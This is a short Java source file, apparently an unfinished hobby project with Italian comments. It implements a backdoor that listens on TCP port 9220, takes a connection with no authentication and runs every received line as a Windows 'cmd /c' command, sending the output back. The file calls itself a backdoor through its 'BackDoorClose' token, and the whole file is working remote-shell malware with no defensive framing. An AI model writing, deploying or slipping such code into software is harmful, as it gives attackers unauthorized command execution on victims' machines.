package remoteConnection;
//DA COMPLETARE
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class RiceviComandi extends Thread{

    private ServerSocket socket;
    private Socket client;
    private BufferedReader in;
    private PrintWriter out;
    private Process p;


    public RiceviComandi()
    {
        client=null;
        try
        {

            socket=new ServerSocket(9220);
            client=socket.accept();
            in=new BufferedReader(new InputStreamReader(client.getInputStream()));
            out = new PrintWriter(client.getOutputStream(), true);
        }
        catch(Exception e)
        {

        }
        System.out.println("Connesso");
        System.out.println(client.getInetAddress());

    }

    public void run()
    {
        String msg=null;
        String finale="";
        while(msg!="BackDoorClose")
        {
            try {
                msg = in.readLine();
                System.out.println("messaggio " + msg);
                if (msg == null || msg == "BackDoorClose") {
                    msg = "BackDoorClose";
                }
                p = Runtime.getRuntime().exec("cmd /c "+msg);

                p.waitFor();
                BufferedReader reader = new BufferedReader(new InputStreamReader(
                        p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println(line);
                    finale+=line+"\n";

                    }


                out.println(finale);
                finale="";
                }
            catch(Exception e)
            {

            }

        }
    }


    public static void main(String[] args)
    {
        RiceviComandi v=new RiceviComandi();
        v.start();
    }

}
